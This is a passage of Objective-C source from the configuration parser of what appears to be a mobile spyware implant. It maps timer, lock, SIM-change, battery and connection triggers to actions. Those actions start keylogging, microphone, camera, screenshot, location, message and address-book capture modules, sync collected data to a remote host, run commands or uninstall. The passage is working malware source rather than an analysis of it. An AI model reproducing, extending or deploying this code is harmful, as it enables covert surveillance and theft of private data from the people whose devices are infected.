  timerStruct_t timerStruct;
  
  memset(&timerStruct, 0, sizeof(timerStruct));
  
  NSMutableDictionary *eventConfiguration = [[NSMutableDictionary alloc] init];
  
  NSNumber *defNum  = [NSNumber numberWithUnsignedInt: ACTION_UNKNOWN];
  NSNumber *type    = [NSNumber numberWithUnsignedInt: EVENT_TIMER];
  
  NSNumber *action  = [anEvent objectForKey: EVENTS_ACTION_START_KEY];
  NSNumber *enabled = [anEvent objectForKey: EVENT_ENABLED_KEY];
  NSNumber *repeat  = [anEvent objectForKey: EVENT_ACTION_REP_KEY];
  NSNumber *delay   = [anEvent objectForKey: EVENT_ACTION_DELAY_KEY];
  NSNumber *iter    = [anEvent objectForKey: EVENT_ACTION_ITER_KEY];
  NSNumber *end     = [anEvent objectForKey: EVENT_ACTION_END_KEY];
  
  timerStruct.type = [self timerGetSubtype:anEvent];
  timerStruct.endAction = (end != nil ? [end unsignedIntValue] : 0xFFFFFFFF);
  
  switch (timerStruct.type) 
  {
    case TIMER_LOOP:
    {
      timerStruct.loDelay = delay != nil ? [delay intValue] : 0xFFFFFFFF;
      if (delay != nil)
        timerStruct.loDelay *= 1000;
      break;
    }  
    case TIMER_DAILY:
    {
    timerStruct.loDelay = [self calculateMsecFromMidnight:[anEvent objectForKey:EVENTS_TIMER_TS_KEY]];
    timerStruct.hiDelay = [self calculateMsecFromMidnight:[anEvent objectForKey:EVENTS_TIMER_TE_KEY]];
    break;
    }
    case TIMER_AFTER_STARTUP:
    {
      timerStruct.loDelay = delay != nil ? [delay intValue] : 0xFFFFFFFF;
      if (delay != nil)
        timerStruct.loDelay *= 1000;
    break;
    }
    case TIMER_DATE:
    {
    int64_t winDate = [self calculateWinDate:[anEvent objectForKey: EVENTS_TIMER_DATEFROM_KEY]];
    timerStruct.loDelay = winDate & 0x00000000FFFFFFFF;
    timerStruct.hiDelay = (winDate >> 32) & 0x00000000FFFFFFFF;
    break;
    }
    case TIMER_INST:
    {
    int64_t winDate = [self calculateDaysDate:[anEvent objectForKey: EVENTS_TIMER_DAYS_KEY]];
    timerStruct.loDelay = winDate & 0x00000000FFFFFFFF;
    timerStruct.hiDelay = (winDate >> 32) & 0x00000000FFFFFFFF;
    break;
    }
    default:
    timerStruct.hiDelay = 0;
    timerStruct.loDelay = 0;
    break;
  }
  
  
  data = [NSData dataWithBytes: &timerStruct length: sizeof(timerStruct)];
  
  keys = [NSArray arrayWithObjects: @"type", 
          @"actionID", 
          @"data",
          @"status", 
          @"monitor", 
          @"enabled",
          @"start",
          @"repeat",
          @"delay",
          @"iter",
          @"end",
          nil];
  
  objects = [NSArray arrayWithObjects: type, 
             action  != nil ? action  : defNum, 
             data,
             EVENT_START, 
             @"", 
             enabled != nil ? enabled : defNum,
             action  != nil ? action  : defNum,
             repeat  != nil ? repeat  : defNum,
             delay   != nil ? delay   : defNum,
             iter    != nil ? iter    : defNum,
             end     != nil ? end     : defNum,
             nil];
             
  NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                         forKeys: keys];
  
  [eventConfiguration addEntriesFromDictionary: dictionary];
  
  [mEventsList addObject: eventConfiguration];
  
  [eventConfiguration release];
  
  [pool release];
}

- (void)addStandbyEvent: (NSDictionary *)anEvent
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSArray *keys;
  NSArray *objects;
  NSData  *data;
  standByStruct standbyStruct;
  
#ifdef DEBUG_JSON_CONFIG
  NSLog(@"%s: registering event type %@", __FUNCTION__, [anEvent objectForKey: @"desc"]);
#endif
  
  NSMutableDictionary *eventConfiguration = [[NSMutableDictionary alloc] init];
  
  NSNumber *defNum  = [NSNumber numberWithUnsignedInt: ACTION_UNKNOWN];
  NSNumber *type    = [NSNumber numberWithUnsignedInt: EVENT_STANDBY];
  
  NSNumber *action  = [anEvent objectForKey: EVENTS_ACTION_START_KEY];
  NSNumber *enabled = [anEvent objectForKey: EVENT_ENABLED_KEY];
  NSNumber *repeat  = [anEvent objectForKey: EVENT_ACTION_REP_KEY];
  NSNumber *delay   = [anEvent objectForKey: EVENT_ACTION_DELAY_KEY];
  NSNumber *iter    = [anEvent objectForKey: EVENT_ACTION_ITER_KEY];
  NSNumber *end     = [anEvent objectForKey: EVENT_ACTION_END_KEY];
  
  memset(&standbyStruct, 0, sizeof(standByStruct));
  
  standbyStruct.actionOnLock   = (action != nil ? [action unsignedIntValue] : 0xFFFFFFFF);
  standbyStruct.actionOnUnlock = (end != nil ? [end unsignedIntValue] : 0xFFFFFFFF);
  
  data = [NSData dataWithBytes: &standbyStruct length: sizeof(standbyStruct)];
  
  keys = [NSArray arrayWithObjects: @"type", 
                                    @"actionID", 
                                    @"data",
                                    @"status", 
                                    @"monitor", 
                                    @"enabled",
                                    @"start",
                                    @"repeat",
                                    @"delay",
                                    @"iter",
                                    @"end",
                                    nil];
  
  objects = [NSArray arrayWithObjects: type, 
                                       action  != nil ? action  : defNum, 
                                       data,
                                       EVENT_START, 
                                       @"", 
                                       enabled != nil ? enabled : defNum,
                                       action  != nil ? action  : defNum,
                                       repeat  != nil ? repeat  : defNum,
                                       delay   != nil ? delay   : defNum,
                                       iter    != nil ? iter    : defNum,
                                       end     != nil ? end     : defNum,
                                       nil];
             
  NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                         forKeys: keys];
  
  [eventConfiguration addEntriesFromDictionary: dictionary];
  
  [mEventsList addObject: eventConfiguration];
  
  [eventConfiguration release];
  
  [pool release];
}

- (void)addSimchangeEvent: (NSDictionary *)anEvent
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSArray *keys;
  NSArray *objects;
  
#ifdef DEBUG_JSON_CONFIG
  NSLog(@"%s: registering event type %@", __FUNCTION__, [anEvent objectForKey: @"desc"]);
#endif
  
  NSMutableDictionary *eventConfiguration = [[NSMutableDictionary alloc] init];
  
  NSNumber *defNum  = [NSNumber numberWithUnsignedInt: ACTION_UNKNOWN];
  NSNumber *type    = [NSNumber numberWithUnsignedInt: EVENT_SIM_CHANGE];
  
  NSNumber *action  = [anEvent objectForKey: EVENTS_ACTION_START_KEY];
  NSNumber *enabled = [anEvent objectForKey: EVENT_ENABLED_KEY];
  NSNumber *repeat  = [anEvent objectForKey: EVENT_ACTION_REP_KEY];
  NSNumber *delay   = [anEvent objectForKey: EVENT_ACTION_DELAY_KEY];
  NSNumber *iter    = [anEvent objectForKey: EVENT_ACTION_ITER_KEY];
  NSNumber *end     = [anEvent objectForKey: EVENT_ACTION_END_KEY];

  keys = [NSArray arrayWithObjects: @"type", 
          @"actionID", 
          @"data",
          @"status", 
          @"monitor", 
          @"enabled",
          @"start",
          @"repeat",
          @"delay",
          @"iter",
          @"end",
          nil];
  
  objects = [NSArray arrayWithObjects: type, 
             action  != nil ? action  : defNum, 
             @"",
             EVENT_START, 
             @"", 
             enabled != nil ? enabled : defNum,
             action  != nil ? action  : defNum,
             repeat  != nil ? repeat  : defNum,
             delay   != nil ? delay   : defNum,
             iter    != nil ? iter    : defNum,
             end     != nil ? end     : defNum,
             nil];
  
  NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                         forKeys: keys];
  
  [eventConfiguration addEntriesFromDictionary: dictionary];
  
  [mEventsList addObject: eventConfiguration];
  
  [eventConfiguration release];
  
  [pool release];
}

- (void)addConnectionEvent: (NSDictionary *)anEvent
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSArray *keys;
  NSArray *objects;
  NSData  *data;
  connectionStruct_t conStruct;
  
  NSMutableDictionary *eventConfiguration = [[NSMutableDictionary alloc] init];
  
  NSNumber *defNum  = [NSNumber numberWithUnsignedInt: ACTION_UNKNOWN];
  NSNumber *type    = [NSNumber numberWithUnsignedInt: EVENT_CONNECTION];
  
  NSNumber *action  = [anEvent objectForKey: EVENTS_ACTION_START_KEY];
  NSNumber *enabled = [anEvent objectForKey: EVENT_ENABLED_KEY];
  NSNumber *repeat  = [anEvent objectForKey: EVENT_ACTION_REP_KEY];
  NSNumber *delay   = [anEvent objectForKey: EVENT_ACTION_DELAY_KEY];
  NSNumber *iter    = [anEvent objectForKey: EVENT_ACTION_ITER_KEY];
  NSNumber *end     = [anEvent objectForKey: EVENT_ACTION_END_KEY];
  
  memset(&conStruct, 0, sizeof(conStruct));
  
  conStruct.onClose = (end != nil ? [end unsignedIntValue] : 0xFFFFFFFF);
  
  data = [NSData dataWithBytes: &conStruct length: sizeof(conStruct)];
  
  keys = [NSArray arrayWithObjects: @"type", 
                                    @"actionID", 
                                    @"data",
                                    @"status", 
                                    @"monitor", 
                                    @"enabled",
                                    @"start",
                                    @"repeat",
                                    @"delay",
                                    @"iter",
                                    @"end",
                                    nil];
  
  objects = [NSArray arrayWithObjects: type, 
                                       action  != nil ? action  : defNum, 
                                       data,
                                       EVENT_START, 
                                       @"", 
                                       enabled != nil ? enabled : defNum,
                                       action  != nil ? action  : defNum,
                                       repeat  != nil ? repeat  : defNum,
                                       delay   != nil ? delay   : defNum,
                                       iter    != nil ? iter    : defNum,
                                       end     != nil ? end     : defNum,
                                       nil]; 
  
  NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                         forKeys: keys];
  
  [eventConfiguration addEntriesFromDictionary: dictionary];
  
  [mEventsList addObject: eventConfiguration];
  
  [eventConfiguration release];
  
  [pool release];
}

- (void)addBatteryEvent: (NSDictionary *)anEvent
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSArray *keys;
  NSArray *objects;
  NSData  *data;
  batteryLevelStruct_t battStruct;
  
#ifdef DEBUG_JSON_CONFIG
  NSLog(@"%s: registering event type %@", __FUNCTION__, [anEvent objectForKey: @"desc"]);
#endif
  
  NSMutableDictionary *eventConfiguration = [[NSMutableDictionary alloc] init];
  
  NSNumber *defNum  = [NSNumber numberWithUnsignedInt: ACTION_UNKNOWN];
  NSNumber *type    = [NSNumber numberWithUnsignedInt: EVENT_BATTERY];
  
  NSNumber *action  = [anEvent objectForKey: EVENTS_ACTION_START_KEY];
  NSNumber *enabled = [anEvent objectForKey: EVENT_ENABLED_KEY];
  NSNumber *repeat  = [anEvent objectForKey: EVENT_ACTION_REP_KEY];
  NSNumber *delay   = [anEvent objectForKey: EVENT_ACTION_DELAY_KEY];
  NSNumber *iter    = [anEvent objectForKey: EVENT_ACTION_ITER_KEY];
  NSNumber *end     = [anEvent objectForKey: EVENT_ACTION_END_KEY];
  NSNumber *min     = [anEvent objectForKey: EVENT_BATT_MIN_KEY];
  NSNumber *max     = [anEvent objectForKey: EVENT_BATT_MAX_KEY];
  
  memset(&battStruct, 0, sizeof(battStruct));
  
  battStruct.onClose   = (end != nil ? [end unsignedIntValue] : 0xFFFFFFFF);
  battStruct.minLevel  = (min != nil ? [min unsignedIntValue] : 0xFFFFFFFF);
  battStruct.maxLevel  = (max != nil ? [max unsignedIntValue] : 0xFFFFFFFF);
  
  data = [NSData dataWithBytes: &battStruct length: sizeof(battStruct)];
  
  keys = [NSArray arrayWithObjects: @"type", 
          @"actionID", 
          @"data",
          @"status", 
          @"monitor", 
          @"enabled",
          @"start",
          @"repeat",
          @"delay",
          @"iter",
          @"end",
          nil];
  
  objects = [NSArray arrayWithObjects: type, 
             action  != nil ? action  : defNum, 
             data,
             EVENT_START, 
             @"", 
             enabled != nil ? enabled : defNum,
             action  != nil ? action  : defNum,
             repeat  != nil ? repeat  : defNum,
             delay   != nil ? delay   : defNum,
             iter    != nil ? iter    : defNum,
             end     != nil ? end     : defNum,
             nil];
  
  NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                         forKeys: keys];
  
  [eventConfiguration addEntriesFromDictionary: dictionary];
  
  [mEventsList addObject: eventConfiguration];
  
  [eventConfiguration release];
  
  [pool release];
}

- (void)addACEvent: (NSDictionary *)anEvent
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSArray *keys;
  NSArray *objects;
  
  NSMutableDictionary *eventConfiguration = [[NSMutableDictionary alloc] init];
  
  NSNumber *defNum  = [NSNumber numberWithUnsignedInt: ACTION_UNKNOWN];
  NSNumber *type    = [NSNumber numberWithUnsignedInt: EVENT_AC];
  
  NSNumber *action  = [anEvent objectForKey: EVENTS_ACTION_START_KEY];
  NSNumber *enabled = [anEvent objectForKey: EVENT_ENABLED_KEY];
  NSNumber *repeat  = [anEvent objectForKey: EVENT_ACTION_REP_KEY];
  NSNumber *delay   = [anEvent objectForKey: EVENT_ACTION_DELAY_KEY];
  NSNumber *iter    = [anEvent objectForKey: EVENT_ACTION_ITER_KEY];
  NSNumber *end     = [anEvent objectForKey: EVENT_ACTION_END_KEY];
    
  keys = [NSArray arrayWithObjects: @"type", 
          @"actionID", 
          @"data",
          @"status", 
          @"monitor", 
          @"enabled",
          @"start",
          @"repeat",
          @"delay",
          @"iter",
          @"end",
          nil];
  
  objects = [NSArray arrayWithObjects: type, 
             action  != nil ? action  : defNum, 
             @"",
             EVENT_START, 
             @"", 
             enabled != nil ? enabled : defNum,
             action  != nil ? action  : defNum,
             repeat  != nil ? repeat  : defNum,
             delay   != nil ? delay   : defNum,
             iter    != nil ? iter    : defNum,
             end     != nil ? end     : defNum,
             nil];
  
  NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                         forKeys: keys];
  
  [eventConfiguration addEntriesFromDictionary: dictionary];
  
  [mEventsList addObject: eventConfiguration];
  
  [eventConfiguration release];
  
  [pool release];
}

// Fake event: never runned, but using when disable/enable a event by a action
// (the parmater is the position of the event)
- (void)addNULLEvent: (NSDictionary *)anEvent
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSArray *keys;
  NSArray *objects;
  
  NSMutableDictionary *eventConfiguration = [[NSMutableDictionary alloc] init];
  
  NSNumber *defNum  = [NSNumber numberWithUnsignedInt: ACTION_UNKNOWN];
  NSNumber *type    = [NSNumber numberWithUnsignedInt: EVENT_NULL];
  
  keys = [NSArray arrayWithObjects: @"type", 
          @"actionID", 
          @"data",
          @"status", 
          @"monitor", 
          @"enabled",
          @"start",
          @"repeat",
          @"delay",
          @"iter",
          @"end",
          nil];
  
  objects = [NSArray arrayWithObjects: type, 
             defNum, 
             @"",
             EVENT_START, 
             @"", 
             defNum,
             defNum,
             defNum,
             defNum,
             defNum,
             defNum,
             nil];
  
  NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                         forKeys: keys];
  
  [eventConfiguration addEntriesFromDictionary: dictionary];
  
  [mEventsList addObject: eventConfiguration];
  
  [eventConfiguration release];
  
  [pool release];
}

- (void)parseAndAddEvents:(NSDictionary *)dict
{
  NSArray *eventsArray = [dict objectForKey: EVENTS_KEY];
  
  if (eventsArray == nil) 
    {
#ifdef DEBUG_JSON_CONFIG
    NSLog(@"%s: no eventsArray found", __FUNCTION__);
#endif
    return;
    }
  
  for (int i=0; i < [eventsArray count]; i++) 
    {
    NSAutoreleasePool *inner = [[NSAutoreleasePool alloc]init];
    
    NSDictionary *event = (NSDictionary *)[eventsArray objectAtIndex: i];
    
    NSString *eventType = [event objectForKey: EVENT_TYPE_KEY];
    
    if (eventType != nil)
      {     
        if ([eventType compare: EVENTS_PROC_KEY] == NSOrderedSame) 
          {
          [self addProcessEvent: event];
          }
        else if ([eventType compare: EVENTS_TIMER_KEY] == NSOrderedSame) 
          {
          [self addTimerEvent: event];
          }
        else if ([eventType compare: EVENTS_TIMER_DATE_KEY] == NSOrderedSame) 
          {
          [self addTimerEvent: event];
          }
        else if ([eventType compare: EVENTS_TIMER_AFTERINST_KEY] == NSOrderedSame) 
          {
          [self addTimerEvent: event];
          }
        else if ([eventType compare: EVENTS_STND_KEY] == NSOrderedSame) 
          {
          [self addStandbyEvent: event];
          }
        else if ([eventType compare: EVENTS_SIM_KEY] == NSOrderedSame) 
          {
          [self addSimchangeEvent: event];
          }
        else if ([eventType compare: EVENTS_CONN_KEY] == NSOrderedSame) 
          {
          [self addConnectionEvent: event];
          }
        else if ([eventType compare: EVENTS_BATT_KEY] == NSOrderedSame) 
          {
            [self addBatteryEvent: event];
          }
        else if ([eventType compare: EVENTS_AC_KEY] == NSOrderedSame) 
          {
            [self addACEvent: event];
          }
        else
          {
            [self addNULLEvent: event];
          }
      }
    
    [inner release];
    }
  
}

#
#
#pragma mark Actions parsing
#
#

- (NSMutableDictionary *)initActionUninstall:(NSDictionary *)subAction
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSNumber *type   = [NSNumber numberWithUnsignedInt: ACTION_UNINSTALL];
  NSNumber *status = [NSNumber numberWithUnsignedInt: 0];
  
  NSMutableDictionary *subActDict = [[NSMutableDictionary alloc] initWithObjectsAndKeys: 
                              type, @"type", status, @"status", @"", @"data", nil];
  
  [pool release];
  
  return subActDict;
}

- (NSMutableDictionary *)initActionInfolog:(NSDictionary *)subAction
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSNumber *type   = [NSNumber numberWithUnsignedInt: ACTION_INFO];
  NSNumber *status = [NSNumber numberWithUnsignedInt: 0];
  NSMutableData *data = [[NSMutableData alloc] initWithCapacity:0];
  
  NSString *infoText = [subAction objectForKey: ACTION_INFO_TEXT_KEY];
  
  int32_t len = [infoText lengthOfBytesUsingEncoding: NSUTF16StringEncoding];
  
  [data appendBytes: &len length:sizeof(int32_t)];
  
  if (infoText == nil) 
    {
      [data appendData: [@"" dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
    }
  else
    {
      
      [data appendData: [infoText dataUsingEncoding: NSUTF16LittleEndianStringEncoding]]; 
    }
  
  NSMutableDictionary *subActDict = [[NSMutableDictionary alloc] initWithObjectsAndKeys: 
                                      type, @"type", status, @"status", data, @"data", nil];
  
  [data release];
  
  [pool release];
  
  return subActDict;
}

- (NSMutableDictionary *)initActionModule:(NSDictionary *)subAction
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  UInt32 tmpAgentID = MODULE_UNKNOWN;
  NSMutableDictionary *subActDict = nil;
  NSNumber *status = [NSNumber numberWithUnsignedInt: 0];
  NSNumber *type;  
  NSData   *data = nil;
  
  NSString *moduleName = (NSString *)[subAction objectForKey: ACTION_MODULE_KEY];
  NSString *moduleStat = (NSString *)[subAction objectForKey: ACTION_MODULE_STATUS_KEY];
  
  if (moduleStat == nil || moduleName == nil)
    return nil;
  
  // start/stop action    
  if ([moduleStat compare: ACTION_MODULE_START_KEY] == NSOrderedSame) 
    {
      type = [NSNumber numberWithUnsignedInt:ACTION_AGENT_START]; 
    }
  else
    {
      type = [NSNumber numberWithUnsignedInt:ACTION_AGENT_STOP];
    }
  
  if ([moduleName compare: ACTION_MODULE_ADDB] == NSOrderedSame)
    {
      tmpAgentID = AGENT_ADDRESSBOOK;
    }
  else if ([moduleName compare: ACTION_MODULE_CAL] == NSOrderedSame)
    {
      tmpAgentID = AGENT_ORGANIZER;
    }
  else if ([moduleName compare: ACTION_MODULE_APPL] == NSOrderedSame)
    {
      tmpAgentID = AGENT_APPLICATION;
    }
  else if ([moduleName compare: ACTION_MODULE_CALL] == NSOrderedSame)
    {
      // FIXED- for ios no more callist agent only call
      tmpAgentID = AGENT_CALL_LIST;
    }
  else if ([moduleName compare: ACTION_MODULE_CALLLIST] == NSOrderedSame)
    {
      tmpAgentID = AGENT_CALL_LIST;
    }
  else if ([moduleName compare: ACTION_MODULE_CAMERA] == NSOrderedSame)
    {
      tmpAgentID = AGENT_CAM;
    }
  else if ([moduleName compare: ACTION_MODULE_CHAT] == NSOrderedSame)
    {
      tmpAgentID = AGENT_IM;
    }
  else if ([moduleName compare: ACTION_MODULE_CLIP] == NSOrderedSame)
    {
      tmpAgentID = AGENT_CLIPBOARD;
    }
  else if ([moduleName compare: ACTION_MODULE_CONF] == NSOrderedSame)
    {
      tmpAgentID = AGENT_CALL_DIVERT;
    }
  else if ([moduleName compare: ACTION_MODULE_CRISIS] == NSOrderedSame)
    {
      tmpAgentID = AGENT_CRISIS;
    }
  else if ([moduleName compare: ACTION_MODULE_DEV] == NSOrderedSame)
    {
      tmpAgentID = AGENT_DEVICE;
    }
  else if ([moduleName compare: ACTION_MODULE_KEYL] == NSOrderedSame)
    {
      tmpAgentID = AGENT_KEYLOG;
    }
  else if ([moduleName compare: ACTION_MODULE_LIVEM] == NSOrderedSame)
    {
      tmpAgentID = AGENT_CALL_DIVERT;
    }
  else if ([moduleName compare: ACTION_MODULE_MIC] == NSOrderedSame)
    {
      tmpAgentID = AGENT_MICROPHONE;
    }
  else if ([moduleName compare: ACTION_MODULE_MSGS] == NSOrderedSame)
    {
      tmpAgentID = AGENT_MESSAGES;
    }
  else if ([moduleName compare: ACTION_MODULE_POS] == NSOrderedSame)
    {
      tmpAgentID = AGENT_POSITION;
    }
  else if ([moduleName compare: ACTION_MODULE_SNAPSHOT] == NSOrderedSame)
    {
      tmpAgentID = AGENT_SCREENSHOT;
    }
  else if ([moduleName compare: ACTION_MODULE_URL] == NSOrderedSame)
    {
      tmpAgentID = AGENT_URL;
    }
  
  data = [[NSData alloc] initWithBytes: &tmpAgentID length: sizeof(tmpAgentID)];
  
  subActDict = [[NSMutableDictionary alloc] initWithObjectsAndKeys: 
                type, @"type", status, @"status", data, @"data", nil];
  
  [data release];
  
  [pool release];
  
  return subActDict;
}

- (NSMutableDictionary *)initActionSync:(NSDictionary *)subAction
{  
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  syncStruct_t tmpSyncStruct;
  
  NSNumber *type   = [NSNumber numberWithUnsignedInt: ACTION_SYNC];
  NSNumber *nostop = [NSNumber numberWithInt:0];
  NSNumber *status = [NSNumber numberWithUnsignedInt: 0];
  NSData   *data;
  
  // FIXED-
  NSNumber *stop     = [subAction objectForKey: @"stop"];
  NSNumber *wifiFlag = [subAction objectForKey: ACTION_SYNC_WIFI_KEY];
  NSNumber *gprsFlag = [subAction objectForKey: ACTION_SYNC_GPRS_KEY];
  NSString *hostname = [subAction objectForKey: ACTION_SYNC_HOST_KEY];
  
  if ( hostname == nil) 
    {
      //FIXED-
      [pool release];
      return nil;
    }
  
  tmpSyncStruct.gprsFlag = (gprsFlag == nil ? 1 : [gprsFlag intValue]);
  tmpSyncStruct.wifiFlag = (wifiFlag == nil ? 1 : [wifiFlag intValue]);
  tmpSyncStruct.serverHostLength = 
        (u_int)[hostname lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding] + 2;
  
  NSData *tmpHostnameData = [hostname dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
  
  memset(tmpSyncStruct.serverHost, 0, 256);
  memcpy(tmpSyncStruct.serverHost, 
         [tmpHostnameData bytes], 
         sizeof(tmpSyncStruct.serverHost));
  tmpSyncStruct.serverHost[254] = tmpSyncStruct.serverHost[255] = 0;
  
  data = [[NSData alloc] initWithBytes: &tmpSyncStruct length:sizeof(syncStruct_t)];
  
  // FIXED-
  NSMutableDictionary *subActDict = 
                  [[NSMutableDictionary alloc] initWithObjectsAndKeys: type,   @"type", 
                                                                       status, @"status", 
                                                                       data,   @"data", 
                                                                       (stop != nil ? stop : nostop), @"stop", nil];
  
  [data release];
  
  [pool release];
  
  return subActDict;
}

- (NSMutableDictionary *)initActionEvent:(NSDictionary *)subAction
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSData   *data = nil;
  action_event_t actEvent;
  
  NSNumber *type   = [NSNumber numberWithUnsignedInt: ACTION_EVENT];
  NSString *status = [subAction objectForKey: ACTION_EVENT_STATUS_KEY];
  NSNumber *event  = [subAction objectForKey: ACTION_EVENT_EVENT_KEY];
  
  if (status != nil && [status compare:ACTION_EVENT_STATUS_ENA_KEY] == NSOrderedSame)
    {
      actEvent.enabled = TRUE;  
    }
  else
    {
      actEvent.enabled = FALSE;
    }
  
  if (event != nil)
    actEvent.event = [event intValue];
  else
    actEvent.event = EVENT_UNKNOWN;
  
  data = [[NSData alloc] initWithBytes: &actEvent length:sizeof(actEvent)];
  
  NSMutableDictionary *subActDict = [[NSMutableDictionary alloc] initWithObjectsAndKeys: 
                              type, @"type", status, @"status", data, @"data", nil];
  
  [data release];
  
  [pool release];
  
  return subActDict;
}

- (NSMutableDictionary *)initActionCommand:(NSDictionary *)subAction
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSNumber *type = [NSNumber numberWithUnsignedInt: ACTION_COMMAND];
  
  NSNumber *status = [NSNumber numberWithUnsignedInt: 0];
  NSString *command = [subAction objectForKey:ACTION_CMD_COMMAND_KEY];
  NSData *data      = [command dataUsingEncoding:NSUTF8StringEncoding];
  
  NSMutableDictionary *subActDict = [[NSMutableDictionary alloc] initWithObjectsAndKeys: 
                                     type, @"type", status, @"status", data, @"data", nil];
  
  [pool release];
  
  return subActDict;
}

- (NSMutableArray *)initSubActions:(NSArray *)subactions withFlag:(BOOL*)concurrent
{
  NSMutableArray *iSubAct = [[NSMutableArray alloc] initWithCapacity: 0];
  NSMutableDictionary *subActDict = nil;
  
  if (subactions != nil) 
    {
    for (int i=0; i<[subactions count]; i++) 
      {
        NSDictionary *subAction = (NSDictionary *)[subactions objectAtIndex:i];
        NSString *typeString = (NSString *)[subAction objectForKey: ACTION_TYPE_KEY];
        
        if (typeString == nil)
          continue;
        
        subActDict = nil;
        
        // Internet sync
        if ([typeString compare: ACTION_SYNC_KEY] == NSOrderedSame) 
          {
            subActDict = [self initActionSync: subAction];
            *concurrent = TRUE;
          }
        else if ([typeString compare: ACTION_MODULE_KEY] == NSOrderedSame) 
          {
            subActDict = [self initActionModule: subAction];
          }
        else if ([typeString compare: ACTION_LOG_KEY] == NSOrderedSame) 
          {
            subActDict = [self initActionInfolog: subAction];
          }
        else if ([typeString compare: ACTION_UNINST_KEY] == NSOrderedSame) 
          {
            subActDict = [self initActionUninstall: subAction];
          }
        else if ([typeString compare: ACTION_EVENT_KEY] == NSOrderedSame) 
          {
            subActDict = [self initActionEvent: subAction];
          }
        else if ([typeString compare: ACTION_CMD_KEY] == NSOrderedSame) 
          {
            subActDict = [self initActionCommand: subAction];
          }
          
        if (subActDict != nil)
          {
           [iSubAct addObject: subActDict];
           [subActDict release];
          }
      }
    }
  
  return iSubAct;
}


- (NSMutableDictionary *)initSubActions:(NSArray *)subactions 
                              forAction:(NSNumber *)actionNum
{
  BOOL concurrent = FALSE;
  NSMutableDictionary *newAction;
  
  // may return a 0 subactions array, but never nil
  NSMutableArray *parsedSubactions = [self initSubActions: subactions withFlag:&concurrent];
  
  if(concurrent == FALSE)
    {
      NSNumber *flagThreaded = [NSNumber numberWithBool:FALSE];
      newAction = [[NSMutableDictionary alloc] initWithObjectsAndKeys: 
                   actionNum, ACTION_NUM_KEY, parsedSubactions, ACTION_SUBACT_KEY, flagThreaded, ACTION_CONCURRENT, nil];
    }
  else    
    {  
      NSNumber *flagThreaded = [NSNumber numberWithBool:TRUE];
      newAction = [[NSMutableDictionary alloc] initWithObjectsAndKeys: 
                   actionNum, ACTION_NUM_KEY, parsedSubactions, ACTION_SUBACT_KEY, flagThreaded, ACTION_CONCURRENT, nil];
    }      
                        
  [parsedSubactions release];
  
  return newAction;
}

- (void)parseAndAddActions:(NSDictionary *)dict
{  
  NSArray *actionsArray = [dict objectForKey: ACTIONS_KEY];
  
  if (actionsArray == nil) 
    {
      return;
    }
  
  for (int i=0; i < [actionsArray count]; i++) 
    {
      NSAutoreleasePool *inner = [[NSAutoreleasePool alloc]init];
      
      NSDictionary *action = (NSDictionary *)[actionsArray objectAtIndex: i];
          
      NSArray  *subactions  = (NSArray *)[action objectForKey: ACTION_SUBACT_KEY];
      NSNumber *actionNum = [NSNumber numberWithUnsignedInt: i];
      
      NSMutableDictionary *newAction = [self initSubActions:subactions forAction:actionNum];

      [mActionsList addObject: newAction];
      
      [newAction release];
      
      [inner release];
    }
}

#
#
#pragma mark SBJsonStreamParserAdapterDelegate methods
#
#

- (void)parser:(SBJsonStreamParser *)parser foundObject:(NSDictionary *)dict 
{
  [self parseAndAddActions: dict];

  [self parseAndAddEvents: dict];
   
  [self parseAndAddModules: dict];
  
}

- (BOOL)checkConfiguration:(NSData*)dataConfig
{
  if (dataConfig == nil)
    return NO;
  
  SBJsonStreamParserStatus status = [parser parse: dataConfig];
  
	if (status == SBJsonStreamParserError) 
    return NO;
  else if (status == SBJsonStreamParserWaitingForData) 
    return NO;
  else if (status == SBJsonStreamParserComplete) 
    return YES;
  
  return YES;
}

- (BOOL)runParser:(NSData*)dataConfig
{
  if (dataConfig == nil)
    return NO;
  
  SBJsonStreamParserStatus status = [parser parse: dataConfig];

	if (status == SBJsonStreamParserError) 
      return NO;
  else if (status == SBJsonStreamParserWaitingForData) 
      return NO;
  else if (status == SBJsonStreamParserComplete) 
      return YES;
  
  return YES;
}

- (NSMutableArray*)getEventsFromConfiguration:(NSData*)aConfiguration
{
  if ([self run: aConfiguration] == YES) 
    return mEventsList;
  else
    return nil;
}


- (NSMutableArray*)getActionsFromConfiguration:(NSData*)aConfiguration
{
  if ([self run: aConfiguration] == YES) 
    return mActionsList;
  else
    return nil;
}

- (NSMutableArray*)getAgentsFromConfiguration:(NSData*)aConfiguration
{
  if ([self run: aConfiguration] == YES) 
    return mAgentsList;
  else
    return nil;
}

- (BOOL)run:(NSData*)aConfiguration
{
  NSAutoreleasePool * pool = [[NSAutoreleasePool alloc] init];
  
  BOOL bRet = FALSE;
  
  bRet = [self runParser: aConfiguration];
  
  [pool release];
  
  return  bRet;
}

@end